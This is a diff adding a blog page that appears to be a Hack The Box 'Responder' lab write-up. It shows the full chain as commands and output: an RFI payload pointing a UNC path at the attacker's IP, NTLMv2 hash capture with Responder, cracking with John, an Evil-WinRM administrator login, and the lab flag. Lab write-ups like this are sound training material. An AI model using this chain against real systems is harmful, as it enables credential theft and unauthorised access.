@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Responder · Z41F3R
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Z41F3R">
+<meta name="description" content="Starting Point machine focused on web enumeration, Remote File Inclusion exploitation, and NTLMv2 authentication capture.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Responder">
+  <meta name="twitter:description" content="Starting Point machine focused on web enumeration, Remote File Inclusion exploitation, and NTLMv2 authentication capture.">
+
+<meta property="og:url" content="http://localhost:1313/writeups/responder/">
+  <meta property="og:site_name" content="Z41F3R">
+  <meta property="og:title" content="Responder">
+  <meta property="og:description" content="Starting Point machine focused on web enumeration, Remote File Inclusion exploitation, and NTLMv2 authentication capture.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="RFI">
+    <meta property="article:tag" content="NTLMv2">
+    <meta property="article:tag" content="Responder">
+    <meta property="article:tag" content="WinRM">
+    <meta property="article:tag" content="Fundamental Exploitation">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/writeups/responder/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+
+<link rel="stylesheet" href="/css/projects.css">
+<link rel="stylesheet" href="/css/writeups.css">
+
+
+
+
+    <script src="/js/writeups.js"></script>
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/avatar.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Z41F3R
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">z41f3r</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/writeups/">WriteUps</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/certificates/">Certificates</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/es/writeups/responder/">🇨🇱</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/writeups/responder/">
+          Responder
+        </a>
+      </h1>
+    </header>
+
+    <h3 id="overview">
+  Overview
+  <a class="heading-link" href="#overview">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Responder</strong> is a machine from the <strong>Starting Point</strong> path on Hack The Box. It is designed to practice fundamental concepts of service enumeration, <strong>Remote File Inclusion (RFI)</strong> exploitation, <strong>NTLMv2</strong> authentication capture, and remote access through <strong>WinRM</strong>.</p>
+<p>The objective is to identify the exposed services, analyze the web application, exploit a remote file inclusion to trigger an SMB authentication attempt, capture the NTLMv2 hash using <strong>Responder</strong>, recover the password through cracking, and use the credentials to access the system through <strong>Evil-WinRM</strong>.</p>
+<hr>
+<h3 id="enumeration">
+  Enumeration
+  <a class="heading-link" href="#enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>We begin by performing a full port scan with <strong>Nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -p- --open --min-rate <span class="m">5000</span> -sS -Pn -T5 &lt;TARGET_IP&gt;
+</span></span></code></pre></div><p>The result shows two exposed services:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+</span></span><span class="line"><span class="cl">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></code></pre></div><p>The identified operating system is <strong>Windows</strong>.</p>
+<p>Port <code>80/tcp</code> is running an Apache server with PHP, while port <code>5985/tcp</code> corresponds to <strong>WinRM</strong>, a remote management protocol used by Windows systems.</p>
+<p>To properly access the website through the domain used by the machine, we configure <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/hosts
+</span></span></code></pre></div><p>We add:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&lt;TARGET_IP&gt; unika.htb
+</span></span></code></pre></div><p>This allows us to access the website through:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://unika.htb
+</span></span></code></pre></div><p><img src="/images/writeups/Responder/pagina.png" alt="login\_ok.png"></p>
+<hr>
+<h3 id="web-enumeration">
+  Web Enumeration
+  <a class="heading-link" href="#web-enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>While analyzing the application, we find a <code>page</code> parameter used to load content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://unika.htb/index.php?page=
+</span></span></code></pre></div><p>This behavior is interesting because the parameter allows an external location to be specified.</p>
+<p>When a web application allows files to be loaded from a location controlled by the user, a vulnerability known as <strong>Remote File Inclusion (RFI)</strong> may occur.</p>
+<p><strong>RFI (Remote File Inclusion)</strong> is a vulnerability in which an application allows resources located on a remote server controlled by an attacker to be included or requested.</p>
+<p>In this case, the application processes the <code>page</code> parameter, so we can investigate what happens when we provide it with a remote location.</p>
+<p><img src="/images/writeups/Responder/RFI_LFI.png" alt="login\_ok.png"></p>
+<hr>
+<h3 id="rfi-exploitation">
+  RFI Exploitation
+  <a class="heading-link" href="#rfi-exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>To understand the exploitation, it is important to know the concept of <strong>UNC</strong>.</p>
+<p><strong>UNC (Universal Naming Convention)</strong> is a format primarily used in Windows to identify network resources. Its usual structure is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">\\server\resource
+</span></span></code></pre></div><p>For example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">\\10.10.16.125\login
+</span></span></code></pre></div><p>When using a UNC path, Windows may attempt to access the resource through <strong>SMB (Server Message Block)</strong>, a protocol used to share files, printers, and other resources over a network.</p>
+<p>In a URL, this path can be represented using:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//10.10.16.125/login
+</span></span></code></pre></div><p>In our case, we use:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://unika.htb/index.php?page=//10.10.16.125/login
+</span></span></code></pre></div><p>The intention is not to directly retrieve a file from our machine, but to cause the Windows server to attempt a connection to our machine through SMB.</p>
+<hr>
+<h3 id="ntlmv2-authentication-capture">
+  NTLMv2 Authentication Capture
+  <a class="heading-link" href="#ntlmv2-authentication-capture">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>To receive the SMB connection, we start <strong>Responder</strong> on our VPN interface:</p>
+<p><img src="/images/writeups/Responder/tool_responder.png" alt="login\_ok.png"></p>
+<p><strong>Responder</strong> is a tool used during security assessments to respond to certain name resolution protocols and network services, potentially triggering or capturing authentication attempts from Windows systems.</p>
+<p>In this scenario, Responder acts as an SMB server prepared to receive the connection generated by the application.</p>
+<p>When the Windows server attempts to access the remote resource, it starts an authentication process.</p>
+<p>This is where <strong>NTLMv2</strong> comes into play.</p>
+<p><strong>NTLM (NT LAN Manager)</strong> is an authentication protocol historically used by Windows systems. <strong>NTLMv2</strong> is a more robust version of the protocol that uses a challenge-response mechanism.</p>
+<p>In simplified form:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Server
+</span></span><span class="line"><span class="cl">   ↓
+</span></span><span class="line"><span class="cl">Challenge
+</span></span><span class="line"><span class="cl">   ↓
+</span></span><span class="line"><span class="cl">Client
+</span></span><span class="line"><span class="cl">   ↓
+</span></span><span class="line"><span class="cl">NTLMv2 Response
+</span></span><span class="line"><span class="cl">   ↓
+</span></span><span class="line"><span class="cl">Server
+</span></span></code></pre></div><p>The system does not directly send the password. Instead, it generates a response based on the password and the received challenge.</p>
+<p>Responder can capture this authentication response.</p>
+<p>After making the request to the application:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://unika.htb/index.php?page=//10.10.16.125/login
+</span></span></code></pre></div><p>Responder captures:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[SMB] NTLMv2-SSP Client   : &lt;TARGET_IP&gt;
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...
+</span></span></code></pre></div><p>The obtained value corresponds to an <strong>NTLMv2 authentication response</strong>, not the password in plaintext.</p>
+<p>Responder stores this information in its logs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">SMB-NTLMv2-SSP-&lt;TARGET_IP&gt;.txt
+</span></span></code></pre></div><hr>
+<h3 id="hash-cracking">
+  Hash Cracking
+  <a class="heading-link" href="#hash-cracking">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Once the NTLMv2 hash has been obtained, we can attempt to recover the password through a dictionary attack.</p>
+<p>For this, we use <strong>John the Ripper</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo john -w<span class="o">=</span>/usr/share/wordlists/john.lst SMB-NTLMv2-SSP-&lt;TARGET_IP&gt;.txt
+</span></span></code></pre></div><p>John identifies the password associated with the <code>Administrator</code> user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">badminton        (Administrator)
+</span></span></code></pre></div><p>This allows us to obtain the credentials:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Username: Administrator
+</span></span><span class="line"><span class="cl">Password: badminton
+</span></span></code></pre></div><p><img src="/images/writeups/Responder/john.png" alt="login\_ok.png"></p>
+<p>It is important to distinguish between <strong>capturing</strong> and <strong>cracking</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Responder
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Captures the NTLMv2 response
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">John the Ripper
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Tests passwords from the dictionary
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Finds the password
+</span></span></code></pre></div><hr>
+<h3 id="access-through-winrm">
+  Access through WinRM
+  <a class="heading-link" href="#access-through-winrm">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>During the initial enumeration, we identified port <code>5985/tcp</code>.</p>
+<p>This port corresponds to <strong>WinRM (Windows Remote Management)</strong>, a service that allows Windows systems to be managed remotely.</p>
+<p>We use <strong>Evil-WinRM</strong>, a tool that allows us to establish a remote session through WinRM:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i &lt;TARGET_IP&gt; -u administrator -p badminton
+</span></span></code></pre></div><p>The connection is successful:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</span></span></code></pre></div><p>We now have a remote PowerShell session on the Windows system.</p>
+<p>We enumerate the user directories:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span></code></pre></div><p>We find:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">mike
+</span></span><span class="line"><span class="cl">Public
+</span></span></code></pre></div><p>The flag is located on the desktop of the <code>mike</code> user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">mike</span><span class="p">\</span><span class="n">desktop</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span></code></pre></div><p>We obtain:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">-a----         3/10/2022   4:50 AM             32 flag.txt
+</span></span></code></pre></div><p>Finally, we display its contents:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">type </span><span class="n">flag</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><hr>
+<h3 id="flag">
+  Flag
+  <a class="heading-link" href="#flag">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The obtained flag is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ea81b7afddd03efaa0945333ed147fac
+</span></span></code></pre></div><hr>
+<h3 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Responder</strong> presents a scenario based on service enumeration, <strong>Remote File Inclusion</strong> exploitation, interaction with <strong>UNC/SMB</strong> resources, <strong>NTLMv2</strong> authentication capture, credential cracking, and remote access through <strong>WinRM</strong>.</p>
+<p>The process followed was:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Enumeration
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Identification of HTTP and WinRM
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Configuration of unika.htb
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Identification of the page parameter
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Identification of RFI
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Use of a UNC path
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">SMB request to our machine
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">NTLMv2 capture with Responder
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Cracking of the NTLMv2 response
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Obtaining Administrator credentials
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Access through Evil-WinRM
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">User enumeration
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Access to mike&#39;s desktop
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">Flag retrieval
+</span></span></code></pre></div><p>Despite its <strong>Very Easy</strong> difficulty, the machine allows us to understand how a web vulnerability can be used as a starting point to trigger an SMB authentication and obtain an NTLMv2 response. This information can then be analyzed through cracking techniques to recover the credentials and obtain remote access to the system through WinRM.</p>
+<hr>
+<h3 id="status-completed">
+  <a href="https://labs.hackthebox.com/achievement/machine/3933963/461"  class="external-link" target="_blank" rel="noopener">Status: Completed</a>
+  <a class="heading-link" href="#status-completed">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     Z41F3R 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
